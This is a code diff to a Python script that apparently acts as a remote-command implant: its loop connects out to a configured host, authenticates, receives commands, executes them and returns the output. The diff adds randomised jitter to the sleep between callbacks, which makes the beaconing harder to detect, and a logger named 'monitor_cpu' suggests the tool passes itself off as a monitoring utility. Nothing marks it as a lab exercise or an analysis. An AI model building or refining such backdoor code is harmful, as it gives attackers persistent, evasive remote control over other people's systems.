@@ -39,6 +39,7 @@ import hashlib
 import commands
 import os
 import ssl
+import random
 
 # ---------------------------------------------------------------------------
 # Compatibility shim
@@ -294,23 +295,25 @@ if __name__ == "__main__":
 
     while True:
         try:
+            jitter = random.uniform(-(sleep_time * 0.2), (sleep_time * 0.5))
+            current_sleep = sleep_time + jitter
             sock = create_connection(host, port)
 
             if not authenticate(sock, secret):
                 sock.close()
-                time.sleep(sleep_time)
+                time.sleep(current_sleep)
                 continue
 
             command = sock.recv(4096)
 
             if not command:
                 sock.close()
-                time.sleep(sleep_time)
+                time.sleep(current_sleep)
                 continue
 
             if command.strip().lower() == "exit":
                 sock.close()
-                time.sleep(sleep_time)
+                time.sleep(current_sleep)
                 continue
 
             output = execute_command(command)
@@ -320,7 +323,8 @@ if __name__ == "__main__":
             sock.close()
 
         except Exception:
-            time.sleep(sleep_time)
+            jitter = random.uniform(-(sleep_time * 0.2), (sleep_time * 0.5))
+            time.sleep(sleep_time + jitter)
 
     if args.verbose:
         logging.getLogger("monitor_cpu").setLevel(logging.DEBUG)
